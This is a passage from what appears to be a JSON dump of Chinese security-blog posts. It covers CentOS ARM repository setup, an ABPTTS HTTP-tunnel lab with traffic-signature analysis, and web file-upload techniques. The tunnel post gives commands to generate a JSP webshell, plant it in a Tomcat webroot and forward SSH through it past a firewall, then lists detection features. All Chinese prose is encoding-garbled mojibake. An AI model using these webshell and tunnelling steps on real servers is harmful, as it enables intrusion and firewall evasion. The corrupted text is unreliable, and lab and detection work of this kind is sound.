http://mirrors.cloud.aliyuncs.com/centos-stream/$stream/AppStream/$basearch/os/gpgcheck=1gpgkey=https://mirrors.aliyun.com/centos/RPM-GPG-KEY-CentOS-Official 123yum clean allyum makecache sudo yum update å¦‚æœæƒ³ä½¿ç”¨dnfçš„è¯ï¼Œä½¿dnfçš„æºä¹Ÿæ›´æ–° 1sudo dnf makecache æ·»åŠ CRBä»“åº“ 1vim /etc/yum.repos.d/centos.repo æœ€åä¸€è¡ŒåŠ å…¥ 12345678[crb]name = =CentOS-$releasever - CRB - mirrors.aliyun.com#failovermethod=prioritybaseurl=https://mirrors.aliyun.com/centos-stream/$stream/CRB/$basearch/os/ http://mirrors.aliyuncs.com/centos-stream/$stream/CRB/$basearch/os/ http://mirrors.cloud.aliyuncs.com/centos-stream/$stream/CRB/$basearch/os/gpgcheck=1gpgkey=https://mirrors.aliyun.com/centos/RPM-GPG-KEY-CentOS-Official 12dnf makecacheyum makecache ç”¨crbä¸‹è½½ 1dnf --enablerepo=crb install &lt;åŒ…å&gt; -y ubuntuå®‰è£…åŒ…æ—¶åˆ¤æ–­ä»“åº“ã€æ¶æ„å¯ä»¥é€šè¿‡https://pkgs.org/æ¥æŸ¥çœ‹è¦ä¸‹è½½çš„åŒ…ï¼Œæ˜¯å±äºå“ªä¸ªä»“åº“æºçš„ æ¯”å¦‚ï¼š 1dnf install libnetfilter_queue-devel æŠ¥é”™æ‰¾ä¸åˆ°è¿™ä¸ªåŒ…ï¼šlibnetfilter_queue-devel åœ¨å®˜ç½‘æŸ¥è¯¢ï¼Œæ‰¾åˆ°è‡ªå·±å¯¹åº”çš„ç³»ç»Ÿç‰ˆæœ¬ã€‚å¯ä»¥çœ‹åˆ°æ˜¾ç¤ºè¿™ä¸ªåŒ…æ˜¯arrch64æ¶æ„çš„ã€‚ ç‚¹è¿›å»æŸ¥çœ‹è¯¦ç»†ä¿¡æ¯ã€‚è¿™é‡Œæ˜¾ç¤ºäº†å®ƒçš„ä»“åº“æ˜¯CRBçš„ï¼Œæ‰€ä»¥éœ€è¦åˆ‡æ¢ä»“åº“ä¸‹è½½ 1dnf --enablerepo=crb install libnetfilter_queue-devel -y pipåŒ…åˆ¤æ–­pipç‰ˆæœ¬ä¸ºpython2.7çš„ 1pip install httplib2 æŠ¥é”™ 12345678910 ERROR: Command errored out with exit status 1: command: /usr/bin/python2 /usr/local/lib/python2.7/dist-packages/pip/_vendor/pep517/_in_process.py get_requires_for_build_wheel /tmp/tmp0SlrZb cwd: /tmp/pip-install-p9wQcj/httplib2 Complete output (4 lines): Traceback (most recent call last): File &quot;/usr/local/lib/python2.7/dist-packages/pip/_vendor/pep517/_in_process.py&quot;, line 16, in &lt;module&gt; from importlib import import_module ImportError: No module named importlib ----------------------------------------ERROR: Command errored out with exit status 1: /usr/bin/python2 /usr/local/lib/python2.7/dist-packages/pip/_vendor/pep517/_in_process.py get_requires_for_build_wheel /tmp/tmp0SlrZb Check the logs for full command output. è¿™æ—¶å€™ä¸è¦å»çœ‹ No module named importlib è€Œæ˜¯å»çœ‹æŠ¥é”™è·¯å¾„usr/bin/python2 /usr/local/lib/python2.7/dist-packages/pip/_vendor/pep517 å®é™…ä¸Šå¯ä»¥å‘ç°ï¼Œarmçš„ç‰ˆæœ¬ä¸‹ï¼Œæ²¡æœ‰è¿™æ¡è·¯å¾„ã€‚ æ‰€ä»¥æƒ³åˆ°åº”è¯¥æŠŠpipçš„æºæ›´æ¢ä¸ºarmçš„æº 1https://www.piwheels.org/simple 1pip install xx -i https://www.piwheels.org/simple ä½†æ˜¯å®‰è£…å¤±è´¥ï¼Œå»æŸ¥è¯¢å®˜ç½‘ï¼Œå¯ä»¥å‘ç° è¿™ä¸ªåŒ…åªæ”¯æŒpython3.ä¸æ”¯æŒpython2.","categories":[{"name":"æ‚ä¸ƒæ‚å…«","slug":"æ‚ä¸ƒæ‚å…«","permalink":"https://gryffinbit.top/categories/%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB/"}],"tags":[{"name":"M1","slug":"M1","permalink":"https://gryffinbit.top/tags/M1/"},{"name":"Arm","slug":"Arm","permalink":"https://gryffinbit.top/tags/Arm/"}],"author":"Gryffinbit"},{"title":"abpttsæµé‡ç‰¹å¾åˆ†æ","slug":"abpttsæµé‡ç‰¹å¾åˆ†æ","date":"2022-09-20T14:25:09.000Z","updated":"2024-11-12T06:59:51.000Z","comments":true,"path":"2022/09/20/abpttsæµé‡ç‰¹å¾åˆ†æ/","permalink":"https://gryffinbit.top/2022/09/20/abptts%E6%B5%81%E9%87%8F%E7%89%B9%E5%BE%81%E5%88%86%E6%9E%90/","excerpt":"","text":"Httpéš§é“ä»‹ç» é€šè¿‡HTTPåè®®ä¸ä»£ç†æœåŠ¡å™¨å»ºç«‹è¿æ¥ï¼ŒæŠŠæ‰€æœ‰è¦ä¼ é€çš„æ•°æ®å…¨éƒ¨å°è£…åˆ°HTTPåè®®é‡Œè¿›è¡Œä¼ é€ï¼Œåè®®ä¸­åŒ…å«æœ‰è¦è¿æ¥çš„è¿œç¨‹ä¸»æœºçš„IPå’Œç«¯å£ï¼Œè¿æ¥æˆåŠŸä¹‹åä¼šè¿”å›ç»™å®¢æˆ·ç«¯200ï¼Œè¡¨ç¤ºéªŒè¯é€šè¿‡ã€‚HTTPéš§é“ç”¨äºåœ¨è¢«é™åˆ¶çš„ç½‘ç»œè¿æ¥ï¼ˆåŒ…æ‹¬é˜²ç«å¢™ã€NATå’ŒACLï¼‰ä»¥åŠå…¶ä»–é™åˆ¶çš„æƒ…å†µä¸‹åœ¨ä¸¤å°è®¡ç®—æœºä¹‹é—´å»ºç«‹ç½‘ç»œé“¾æ¥ã€‚ é€‚ç”¨ç¯å¢ƒ è·å–webshellçš„ä¸»æœºä½äºå†…ç½‘ï¼Œå¹¶ä¸”è¯¥å†…ç½‘ä¸»æœºçš„icmpã€dnsã€tcpå’Œudpåè®®ç­‰éƒ½ä¸èƒ½å‡ºç½‘ï¼Œå”¯ä¸€çš„æ•°æ®é€šé“æ˜¯webshellæ­å»ºæ­£å‘ä»£ç†ã€‚ abpttsabpttsæ˜¯ä¸€æ¬¾åŸºäºsslåŠ å¯†çš„httpéš§é“å·¥å…·ã€‚å…¨ç¨‹é€šä¿¡æ•°æ®åŠ å¯†æœ‰æ•ˆå¯¹æŠ—æ£€æµ‹ã€‚ å°†TCPæµé‡é€šè¿‡HTTP&#x2F;HTTPSè¿›è¡Œæµé‡è½¬å‘ï¼Œåœ¨ç›®å‰äº‘ä¸»æœºçš„å¤§ç¯å¢ƒä¸­ï¼Œå‘æŒ¥äº†æ¯”è¾ƒé‡è¦çš„ä½œç”¨ï¼Œå¯ä»¥é€šè¿‡è„šæœ¬è¿›è¡ŒRDP,SSH,Meterpreterçš„äº¤äº’ä¸è¿æ¥ã€‚ä¹Ÿæ„å‘³ç€è¿™æ ·å¯ä»¥å»ºç«‹ä¸€ä¸ªé€šè¿‡80ç«¯å£å¾—æµé‡å‡ºç«™æ¥é€ƒé¿é˜²ç«å¢™ã€‚ä¸å…¶å®ƒhttpéš§é“ä¸åŒçš„æ˜¯ï¼Œabpttsæ˜¯å…¨åŠ å¯†ã€‚ åªæ”¯æŒaspxå’Œjspã€‚ä¸æ”¯æŒphp ç¯å¢ƒæ­å»ºç½‘ç»œæƒ…å†µè™šæ‹Ÿæœºä¹‹é—´éƒ½é‡‡ç”¨æ¡¥æ¥æ¨¡å¼ï¼Œèƒ½å¤Ÿäº’ç›¸è®¿é—®åˆ°ã€‚tomcatæœåŠ¡å™¨å’Œä¸€ä¸ªè™šæ‹Ÿæœºç»„æˆå†…ç½‘ç¯å¢ƒã€‚tomcatæœåŠ¡å™¨é‡‡ç”¨ä¸¤ä¸ªç½‘å¡ã€‚ä¸€ä¸ªå¯¹å†…ï¼Œå½¢æˆå†…ç½‘ç¯å¢ƒï¼Œä¸€ä¸ªå¯¹å¤–ï¼Œå¯ä»¥è¢«kaliè®¿é—®åˆ°ã€‚ æ”»å‡»æœº Kali Linux 2022.3 amd64 ã€æ­å»ºåœ¨MacBookProä¸Šï¼Œx86æ¶æ„ã€‘ IPï¼š192.168.0.101 tomcat æœåŠ¡å™¨ CentOs-Steam-9 Arm64 ã€æ­å»ºåœ¨Mac mini pdè™šæ‹Ÿæœºä¸Šï¼ŒARMæ¶æ„ã€‘å¤–ç½‘IPï¼š192.168.0.102 å†…ç½‘IPï¼š10.37.129.1 ubuntu å†…ç½‘æœº ã€æ­å»ºåœ¨Mac mini pdè™šæ‹Ÿæœºä¸Šï¼ŒARMæ¶æ„ã€‘ IPï¼š10.37.129.3 è¿é€šæƒ…å†µ kaliå¯ä»¥pingé€š192.168.0.102ï¼Œå¯ä»¥è®¿é—®åˆ°192.168.0.102:8080çš„tomcatæœåŠ¡å™¨ã€‚ kaliæ— æ³•è®¿é—®å†…ç½‘æœºå™¨10.37.129.3 æ€è·¯æ•´ç†æ”»å‡»æœºAï¼ˆkaliï¼‰æ‹¿åˆ°äº†æœåŠ¡å™¨Bï¼ˆtomcat centosï¼‰çš„æƒé™ã€‚Bé€šè¿‡22ç«¯å£å»è¿æ¥å†…ç½‘æœºå™¨Cï¼ˆubuntuï¼‰ï¼Œç„¶åæŠŠBçš„22ç«¯å£æ˜ å°„åˆ°æ”»å‡»æœºAçš„æŸç«¯å£ä¸Šã€‚å®ç°äº†éš§é“æŠ€æœ¯ã€‚è¿™æ ·å»è®¿é—®Açš„é‚£ä¸ªæ˜ å°„ç«¯å£ï¼Œå°±ç›¸å½“äºè®¿é—®Bçš„22ç«¯å£ã€‚è¿™æ ·èµ°çš„æ˜¯httpåè®®ã€‚å°±å¯ä»¥ç ´è§£äº†å®ƒçš„é™åˆ¶ã€‚ï¼ˆé™åˆ¶udpã€tcpè¿™äº›ä¸èƒ½å‡ºç½‘ï¼‰ æ”»å‡»æœºkali å¯é€‰ éœ€è¦python2ã€pip2çš„ç‰ˆæœ¬ 12sudo hwclock --hctosys sudo apt-get update å®‰è£…pip2çš„æ–¹æ³• 12wget https://bootstrap.pypa.io/pip/2.7/get-pip.pypython2 get-pip.py 12export PATH=/home/&lt;usrname&gt;/.local/bin:$PATH # æ·»åŠ åˆ°æ™®é€šç”¨æˆ·export PATH=/root/.local/bin:$PATH # æ·»åŠ åˆ°rootç”¨æˆ· å®‰è£…httplib2 1pip install httplib2 å®‰è£…cryptoç»„ä»¶ 1pip install -i https://pypi.douban.com/simple/ pycryptodome ä¸‹è½½abptts 12git clone https://github.com/nccgroup/ABPTTS.gitcd ABPTTS ç”Ÿæˆå¯¹åº”webshellï¼Œä¼šåœ¨å½“å‰ç›®å½•ä¸‹ç”Ÿæˆwebshellæ–‡ä»¶ï¼Œé‡Œé¢å­˜æ”¾ç€jspå’Œaspxçš„webshellæ–‡ä»¶ 1python2 abpttsfactory.py -o webshell ubuntuä¸Šé¢çš„å®‰è£…æ–¹æ³• ubuntuæœåŠ¡å™¨ å®‰è£…python2 123wget https://bootstrap.pypa.io/pip/2.7/get-pip.pypython get-pip.pypip -V å®‰è£…httplib2 1pip install httplib2 å®‰è£…cryptoç»„ä»¶ 1pip install -i https://pypi.douban.com/simple/ pycryptodome å®‰è£…abptts 1git clone https://github.com/nccgroup/ABPTTS.git ç”Ÿæˆwebshell 1python2 abpttsfactory.py -o webshell å†…ç½‘æœºå™¨ centoså®‰è£…tomcat ä¸‹è½½tomcatï¼Œé€‰ç”¨äº†8.0ç‰ˆæœ¬ å®‰è£…Java https://www.oracle.com/java/technologies/downloads/#java8 ç™»å½•ä¸‹è½½éœ€è¦çš„javaåŒ…ï¼Œé€‰tar.gzçš„ æŠŠjavaåŒ…æ”¾è¿›centosï¼Œè§£å‹åˆ°javawebç›®å½•ä¸‹ 1tar -zxv -f jdk-8u341-linux-aarch64.tar.gz -C /usr/local/java è®¾ç½®ç¯å¢ƒå˜é‡ 1vim /etc/profile æ·»åŠ  1234export JAVA_HOME=/usr/local/java/jdk1.8.0_341export JRE_HOME=$&#123;JAVA_HOME&#125;/jreexport CLASSPATH=.:$&#123;JAVA_HOME&#125;/lib:$&#123;JRE_HOME&#125;/libexport PATH=$&#123;JAVA_HOME&#125;/bin:$PATH ä½¿æ–‡ä»¶ç”Ÿæ•ˆ 1source /etc/profile æ·»åŠ è½¯é“¾æ¥ 1ln -s /usr/local/java/jdk1.8.0_341/bin/java /usr/bin/java æ£€æŸ¥ 1java -version å®‰è£…tomcat æ–°å»ºtomcatæ–‡ä»¶å¤¹ 12mkdir /usr/local/Tomcat8tar -zxvf apache-tomcat-8.5.82.tar.gz -C /usr/local/Tomcat8/ ææƒ 1chmod +x /usr/local/Tomcat8/apache-tomcat-8.5.82/bin/*.sh å¯åŠ¨tomcat 12cd /usr/local/Tomcat8/apache-tomcat-8.5.82/bin./startup.sh è®¿é—®ç«™ç‚¹ 1curl 127.0.0.1:8080 ä½¿å…¶ä»–æœºå™¨å¯ä»¥è®¿é—®åˆ°å®ƒçš„ç½‘ç«™ é˜²ç«å¢™çš„ä¸€äº›è®¾ç½® 1234sudo dnf install firewalld -ysystemctl unmask firewalldsudo systemctl enable firewalld --nowsystemctl status firewalld 123firewall-cmd --permanent --zone=public --add-port=8080/tcp firewall-cmd --reloadfirewall-cmd --zone=public --query-port=8080/tcp åŒä¸€ä¸ªå±€åŸŸç½‘çš„æœºå™¨å¯ä»¥æˆåŠŸè®¿é—®åˆ°centosä¸Šé¢çš„tomcat æ”»å‡»è¿‡ç¨‹kali å°†ç”Ÿæˆçš„webshellï¼Œä¸Šä¼ åˆ°tomcatæœåŠ¡å™¨ï¼ˆé‡‡ç”¨scpä¸Šä¼ å°±å¯ä»¥ï¼‰ 12cd ABPTTS/webshellscp abptts.jsp root@192.168.0.102:/usr/local/Tomcat8/apache-tomcat-8.5.82/webapps/ROOT ä¸Šä¼ æˆåŠŸ tomcatæœåŠ¡å™¨centos sshé“¾æ¥å†…ç½‘æœºå™¨ 1ssh root@10.37.129.3 kali æŠŠcentos tomcatçš„22ç«¯å£æ˜ å°„åˆ°æ”»å‡»æœºçš„7777ç«¯å£ä¸Š 12cd ABPTTSpython2 abpttsclient.py -c webshell/config.txt -u http://192.168.0.102:8080/abptts.jsp -f 127.0.0.1:7777/127.0.0.1:22 åœ¨æ”»å‡»æœºä¸Šä½¿ç”¨sshé“¾æ¥127.0.0.1:7777å°±ç›´è¿åˆ°centos tomcatæœºå™¨ä¸Šäº† 1ssh root@127.0.0.1 -p 7777 æŠ“åŒ…åˆ†æåœ¨tomcat centos æœåŠ¡å™¨ä¸Šï¼Œç›‘å¬å¤–ç½‘ç½‘å£ã€‚kaliè¿æ¥ã€‚æŠ“å–æµé‡åŒ…åˆ†æ èµ°çš„æ˜¯httpåè®® è¿½è¸ªhttpæ•°æ®æµï¼Œå‘ç°è¯·æ±‚å¤´é‡Œéƒ½åŒ…å«ä»¥ä¸‹æµé‡ç‰¹å¾ï¼š æ˜¯è§£å¯†ç”¨çš„key 1HorrendousDepartment= æœ‰ä¸€ä¸ªç‰¹æ®Šå­—æ®µ 1x-nearness-ennobling-auditioned: tJRfAOSJ28HF71+Ah/1GrM7mmOBjbe4CnmjTQV7dgiM= å›ºå®šçš„user-agent 1user-agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; .NET CLR 1.0.3705) å‚è€ƒæ–‡ç« https://www.freebuf.com/sectool/259855.html","categories":[{"name":"æ¸—é€æµ‹è¯•","slug":"æ¸—é€æµ‹è¯•","permalink":"https://gryffinbit.top/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"},{"name":"å†…ç½‘æ¸—é€","slug":"æ¸—é€æµ‹è¯•/å†…ç½‘æ¸—é€","permalink":"https://gryffinbit.top/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"}],"tags":[{"name":"httpéš§é“","slug":"httpéš§é“","permalink":"https://gryffinbit.top/tags/http%E9%9A%A7%E9%81%93/"}],"author":"Gryffinbit"},{"title":"webæ–‡ä»¶ä¸Šä¼ æ–¹å¼æ€»ç»“","slug":"webæ–‡ä»¶ä¸Šä¼ æ–¹å¼æ€»ç»“","date":"2022-09-20T10:50:51.000Z","updated":"2024-08-27T02:28:09.000Z","comments":true,"path":"2022/09/20/webæ–‡ä»¶ä¸Šä¼ æ–¹å¼æ€»ç»“/","permalink":"https://gryffinbit.top/2022/09/20/web%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/","excerpt":"","text":"å‰è¨€upload-labs æ–‡ä»¶ä¸Šä¼ é¶åœºé€šè¿‡ï¼Œè·³è½¬Blog ï¼šhttps://gryffinbit.top/2022/09/16/upload-labs%E9%9D%B6%E5%9C%BA%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/ Webæ–‡ä»¶ä¸Šä¼ æ–¹æ³•æ€»ç»“è¡¨å•ä¸Šä¼ è¿™æ˜¯ä¼ ç»Ÿçš„formè¡¨å•ä¸Šä¼ ï¼Œä½¿ç”¨formè¡¨å•çš„input[type=â€fileâ€]æ§ä»¶ï¼Œå¯ä»¥æ‰“å¼€ç³»ç»Ÿçš„æ–‡ä»¶é€‰æ‹©å¯¹è¯æ¡†ï¼Œä»è€Œè¾¾åˆ°é€‰æ‹©æ–‡ä»¶å¹¶ä¸Šä¼ çš„ç›®çš„ï¼Œå®ƒçš„å¥½å¤„æ˜¯å¤šæµè§ˆå™¨å…¼å®¹ï¼Œå®ƒæ˜¯webå¼€å‘è€…æœ€å¸¸ç”¨çš„ä¸€ç§æ–‡ä»¶ä¸Šä¼ æ–¹å¼ã€‚ è¡¨å•çš„ä»£ç å¦‚ä¸‹ï¼š 12345&lt;form method=&quot;post&quot; action=&quot;http://uploadUrl&quot; enctype=&quot;multipart/form-data&quot;&gt; &lt;input name=&quot;file&quot; type=&quot;file&quot; accept=&quot;image/gif,image.jpg&quot; /&gt; &lt;input name=&quot;token&quot; type=&quot;hidden&quot; /&gt; &lt;input type=&quot;submit&quot; value=&quot;æäº¤&quot; /&gt;&lt;/form&gt; ä»¥ä¸‹æ˜¯è¡¨å•ä¸Šä¼ å‡ ä¸ªå…³é”®ç‚¹ï¼š method=â€postâ€ï¼š é‡‡ç”¨postæ–¹å¼æäº¤æ•°æ® enctype=â€multipart/form- dataâ€ï¼šé‡‡ç”¨multipartæ ¼å¼ä¸Šä¼ æ–‡ä»¶ï¼Œæ­¤æ—¶requestå¤´ä¼šæ˜¾ç¤º Content-Type:multipart/form-data; boundary=â€”-WebKitFormBoundaryzr34cwJ67R95KQC9 actionï¼šæ ‡æ˜ä¸Šä¼ çš„æœåŠ¡ç«¯å¤„ç†åœ°å€ type=â€fileâ€ï¼šä½¿ç”¨inputçš„fileæ§ä»¶ä¸Šä¼  å¦‚æœæ˜¯å¤šæ–‡ä»¶æ‰¹é‡ä¸Šä¼ ï¼Œå¯ä»¥å°†input[type=â€fileâ€]çš„nameå±æ€§è®¾ç½®ä¸ºå¦‚ï¼šname=â€file[]â€ acceptå±æ€§æ˜¯HTML5çš„æ–°å±æ€§ï¼Œå®ƒè§„å®šäº†å¯é€šè¿‡æ–‡ä»¶ä¸Šä¼ æäº¤çš„æ–‡ä»¶ç±»å‹ ä¸Šä¼ çš„è§¦å‘äº‹ä»¶å¯ä»¥æ˜¯ï¼šinput[type=â€fileâ€]çš„onChangeè§¦å‘ï¼Œä¹Ÿå¯ä»¥ç”±ä¸€ä¸ªç‹¬ç«‹çš„æŒ‰é’®çš„onClickä½¿æ•´ä¸ªè¡¨å•æäº¤ï¼Œæ­¤æ—¶è¿˜å¯ä»¥ç”¨input[type&#x3D;â€hiddenâ€]å¸¦ä¸€äº›å…¶å®ƒçš„å‚æ•°ï¼Œæ¯”å¦‚Tokenæ¥æºéªŒè¯ç­‰ç­‰ã€‚ Ajax æ— åˆ·æ–°ä¸Šä¼ Ajaxæ— åˆ·æ–°ä¸Šä¼ çš„æ–¹å¼ï¼Œæœ¬è´¨ä¸Šä¸è¡¨å•ä¸Šä¼ æ— å¼‚ï¼Œåªæ˜¯æŠŠè¡¨å•é‡Œçš„å†…å®¹æå‡ºæ¥é‡‡ç”¨ajaxæäº¤ï¼Œå¹¶ä¸”ç”±å‰ç«¯å†³å®šè¯·æ±‚ç»“æœå›ä¼ åçš„å±•ç¤ºç»“æœï¼Œä¸ç”¨åƒç›´æ¥è¡¨å•ä¸Šä¼ é‚£æ ·åˆ·æ–°å’Œè·³è½¬é¡µé¢ã€‚ htmlä»£ç ç‰‡æ®µå¦‚ä¸‹ï¼š 1234&lt;form&gt; &lt;input id=&quot;file&quot; name=&quot;file&quot; type=&quot;file&quot; /&gt; &lt;input id=&quot;token&quot; name=&quot;token&quot; type=&quot;hidden&quot; /&gt;&lt;/form&gt; javascriptä»£ç ç‰‡æ®µå¦‚ä¸‹ï¼š 123456789101112131415$(&quot;#file&quot;).on(&quot;change&quot;, function()&#123; var formData = new FormData(); formData.append(&quot;file&quot;, $(&quot;#file&quot;)[0].files); formData.append(&quot;token&quot;, $(&quot;#token&quot;).val()); $.ajax(&#123; url: &quot;http://uploadUrl&quot;, type: &quot;POST&quot;, data: formData, processData: false, contentType: false, success: function(response)&#123; // æ ¹æ®è¿”å›ç»“æœæŒ‡å®šç•Œé¢æ“ä½œ &#125; &#125;);&#125;); ä½¿ç”¨fileæ§ä»¶çš„changeæ¥è§¦å‘ä¸Šä¼ äº‹ä»¶ï¼Œå½“ç„¶ä¹Ÿå¯ä»¥ä½¿ç”¨æŸä¸ªæŒ‰é’®æ¥è§¦å‘è¡¨å•æäº¤ã€‚æäº¤æ•°æ®æ—¶ï¼Œç”¨åˆ°äº†FormDataå¯¹è±¡æ¥å‘é€äºŒè¿›åˆ¶æ–‡ä»¶ï¼ŒFormDataæ„é€ å‡½æ•°æä¾›çš„append()æ–¹æ³•ï¼Œé™¤äº†ç›´æ¥æ·»åŠ äºŒè¿›åˆ¶æ–‡ä»¶è¿˜å¯ä»¥é™„å¸¦ä¸€äº›å…¶å®ƒçš„å‚æ•°ï¼Œ ä½œä¸ºXMLHttpRequestå®ä¾‹çš„å‚æ•°æäº¤ç»™æœåŠ¡ç«¯ã€‚ ä½¿ç”¨jQueryæä¾›çš„ajaxæ–¹æ³•æ¥å‘é€äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œè¿˜éœ€è¦é™„åŠ ä¸¤ä¸ªå‚æ•°ï¼š processData: false &#x2F;&#x2F; ä¸è¦å¯¹dataå‚æ•°è¿›è¡Œåºåˆ—åŒ–å¤„ç†ï¼Œé»˜è®¤ä¸ºtrue contentType: false &#x2F;&#x2F; ä¸è¦è®¾ç½®Content-Typeè¯·æ±‚å¤´ï¼Œå› ä¸ºæ–‡ä»¶æ•°æ®æ˜¯ä»¥ multipart&#x2F;form-data æ¥ç¼–ç  æˆªå›¾ç²˜è´´ä¸Šä¼ æˆªå›¾ç²˜è´´ä¸Šä¼ çš„æ ¸å¿ƒæ€æƒ³æ˜¯ï¼Œç›‘å¬ç²˜è´´äº‹ä»¶ï¼Œç„¶åè·å–å‰ªåˆ‡æ¿ä¸­çš„æ•°æ®ï¼Œå¦‚æœæ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œåˆ™è§¦å‘ä¸Šä¼ äº‹ä»¶ã€‚ç³»ç»Ÿå‰ªåˆ‡ç‰ˆçš„æ•°æ®åœ¨ä¸åŒæµè§ˆå™¨ä¿å­˜åœ¨ä¸åŒçš„ä½ç½® IEå†…æ ¸ï¼šwindows.clipboardData å…¶å®ƒï¼še.originalEvent.clipboardData 1234567891011121314151617181920212223$(&quot;textarea&quot;).on(&quot;paste&quot;, function(e)&#123; e.stopPropagation(); var self = this; var clipboardData = e.originalEvent.clipboardData; if (clipboardData.items.length &lt;= 0) &#123; return; &#125; var file = clipboardData.items[0].getAsFile(); if (!file) &#123; return; &#125; var formData = new FormData(); formData.append(&quot;file&quot;, file); formData.append(&quot;token&quot;, $(&quot;#token&quot;).val()); $.ajax(&#123; url: &quot;http://uploadUrl&quot;, type: &quot;POST&quot;, data: formData, &#125;).done(function(response) &#123; // æ ¹æ®è¿”å›ç»“æœæŒ‡å®šç•Œé¢æ“ä½œ &#125;); e.preventDefault();&#125;); æ‹–æ‹½ä¸Šä¼ æ‹–æ‹½ä¸Šä¼ çš„æ–¹å¼ï¼Œæ”¯æŒçš„æµè§ˆå™¨æ¯”è¾ƒå°‘ï¼Œå› ä¸ºå®ƒç”¨åˆ°äº†HTML5çš„ä¸¤ä¸ªæ–°çš„å±æ€§ï¼ˆAPIï¼‰ä¸€ä¸ªæ˜¯Drag and Drop,ä¸€ä¸ªæ˜¯File APIã€‚ ä¸Šä¼ åŸŸç›‘å¬æ‹–æ‹½çš„ä¸‰ä¸ªäº‹ä»¶ï¼šdragEnterã€dragOverå’Œdropï¼Œåˆ†åˆ«å¯¹åº”æ‹–æ‹½è‡³ã€æ‹–æ‹½æ—¶å’Œé‡Šæ”¾ä¸‰ä¸ªæ“ä½œçš„å¤„ç†æœºåˆ¶ï¼Œå½“ç„¶ä½ ä¹Ÿå¯ä»¥ç›‘å¬dragLeaveäº‹ä»¶ã€‚ HTML5çš„File APIæä¾›äº†ä¸€ä¸ªFileListçš„æ¥å£ï¼Œå®ƒå¯ä»¥é€šè¿‡æ‹–æ‹½äº‹ä»¶çš„e.dataTransfer.filesæ¥ä¼ é€’çš„æ–‡ä»¶ä¿¡æ¯ï¼Œè·å–æœ¬åœ°æ–‡ä»¶åˆ—è¡¨ä¿¡æ¯ã€‚ File APIåœ¨HTML5è§„èŒƒä¸­åªæ˜¯è‰æ¡ˆï¼Œåœ¨ W3C è‰æ¡ˆä¸­ï¼ŒFile å¯¹è±¡åªåŒ…å«æ–‡ä»¶åã€æ–‡ä»¶ç±»å‹å’Œæ–‡ä»¶å¤§å°ç­‰åªè¯»å±æ€§ã€‚ä½†éƒ¨åˆ†æµè§ˆå™¨åœ¨è‰æ¡ˆä¹‹å¤–æä¾›äº†ä¸€ä¸ªåä¸º FileReader çš„å¯¹è±¡ï¼Œç”¨ä»¥è¯»å–æ–‡ä»¶å†…å®¹ï¼Œå¹¶ä¸”å¯ä»¥ç›‘æ§è¯»å–çŠ¶æ€ï¼Œå®ƒæä¾›çš„æ–¹æ³•æœ‰ï¼š â€œreadAsBinaryStringâ€ ï¼Œâ€readAsDataURLâ€ ï¼Œâ€readAsTextâ€ ï¼Œâ€abortâ€ ç­‰ã€‚ 1234567891011121314151617181920212223242526272829// dragenter$(&quot;#textarea&quot;).on(&quot;dragenter&quot;, function(e)&#123; e.preventDefault();&#125;);// dragover$(&quot;#textarea&quot;).on(&quot;dragover&quot;, function(e)&#123; e.preventDefault();&#125;);// drop$(&quot;#textarea&quot;).on(&quot;drop&quot;, function(e)&#123; e.stopPropagation(); e.preventDefault(); var files = e.originalEvent.dataTransfer.files; _.each(files, function(file) &#123; if (!/^image*/.test(file.type)) &#123; return; &#125; var fileReader = new FileReader(); fileReader.onload = function() &#123; //uploadFile(file); &#125;; fileReader.readAsDataURL(file); &#125;);&#125;); æ‹–æ‹½ä¸Šä¼ è¿‡ç¨‹ä¸­çš„å‡ ä¸ªå…³é”®ç‚¹ï¼š åœ¨dropäº‹ä»¶è§¦å‘åé€šè¿‡e.dataTransfer.filesè·å–æ‹–æ‹½æ–‡ä»¶åˆ—è¡¨ï¼Œåœ¨jQueryä¸­æ˜¯e.originalEvent.dataTransfer.files æ‹–æ‹½ä¸Šä¼ ä»…æ”¯æŒå›¾ç‰‡ï¼Œæ–‡ä»¶å¯¹è±¡ä¸­file.typeæ ‡è¯†äº†æ–‡ä»¶ç±»å‹ã€‚ ç”±äºå¯èƒ½æ˜¯å¤šå›¾æ‹–æ‹½ï¼Œæ‰€ä»¥å¯ä»¥éå†å›¾ç‰‡ä¸Šä¼ ï¼Œè¿™é‡Œç”¨äº†Underscoreçš„eachæ–¹æ³•ã€‚ è¿™é‡Œç”¨readAsDataURLè¯»å–æ–‡ä»¶å†…å®¹ä¸ºäºŒè¿›åˆ¶æ–‡ä»¶ï¼Œä½ è¿˜å¯ä»¥å°†å…¶è½¬æ¢ä¸ºBase64æ–¹å¼ä¸Šä¼ ï¼Œåªæ˜¯httpåè®®é‡Œé¢å­˜åœ¨å¯¹éäºŒè¿›åˆ¶æ•°æ®çš„ä¸Šä¼ å¤§å°é™åˆ¶ä¸º2Mã€‚ ä¸Šä¼ çš„è¿‡ç¨‹è·Ÿå‰é¢çš„æ–¹å¼ç›¸åŒï¼Œå³ï¼šåˆ›å»ºFormDataå¯¹è±¡å¹¶å‘èµ·Ajaxè¯·æ±‚ã€‚ æ‹ç…§ä¸Šä¼ æ‹ç…§ä¸Šä¼ å¯ä»¥æ˜¯PCä¸Šçš„æ‘„åƒå¤´æ‹ç…§ä¸Šä¼ ä¹Ÿå¯ä»¥æ˜¯æ‰‹æœºç­‰ç§»åŠ¨è®¾å¤‡çš„æ‹ç…§ä¸Šä¼ ã€‚ ä¸Šä¼ æ–‡ä»¶æ—¶å¿…é¡»åšå¥½æ–‡ä»¶çš„å®‰å…¨æ€§ï¼Œé™¤äº†å‰ç«¯å¿…è¦çš„éªŒè¯ï¼Œå¦‚æ–‡ä»¶ç±»å‹ã€åç¼€ã€å¤§å°ç­‰éªŒè¯ï¼Œé‡è¦çš„è¿˜æ˜¯è¦åœ¨åå°åšå®‰å…¨ç­–ç•¥ã€‚ è¿™é‡Œæˆ‘åˆ—ä¸¾å‡ ä¸ªæ³¨æ„ç‚¹ï¼š 